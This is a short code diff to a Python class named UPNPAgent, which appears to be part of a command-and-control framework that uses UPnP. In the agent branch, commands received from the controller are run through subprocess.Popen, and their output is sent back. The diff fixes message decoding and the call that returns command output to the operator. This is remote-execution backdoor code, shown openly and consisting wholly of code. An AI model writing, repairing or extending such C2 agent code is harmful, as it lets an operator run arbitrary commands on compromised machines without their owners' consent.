@@ -112,7 +112,7 @@ class UPNPAgent:
         message_content = message[1:]
         if self.is_c2:
             if agent_ip in self.agents:
-                print(f"MESSAGE {agent_ip}: {message_content}")
+                print(f"MESSAGE {agent_ip}: {message_content.decode('utf8')}")
                 open('message_history.txt', 'a+', encoding='utf8').write(f"{agent_ip} -> {message_content}\n")
         elif not self.is_c2:
             if command == ord('c'):
@@ -120,7 +120,7 @@ class UPNPAgent:
                 command_args = message_content.decode('utf8').split()
                 process = subprocess.Popen(command_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                 stdout, stderr = process.communicate()
-                self.queue_message((stdout + "\n" + stderr + "\n").encode('utf8'))
+                self.queue_message(agent_ip, b'm', (stdout + "\n" + stderr + "\n").encode('utf8'))
             elif command == ord('m'):
                 print("Received C2 Message ", message_content.decode('utf8'))
             
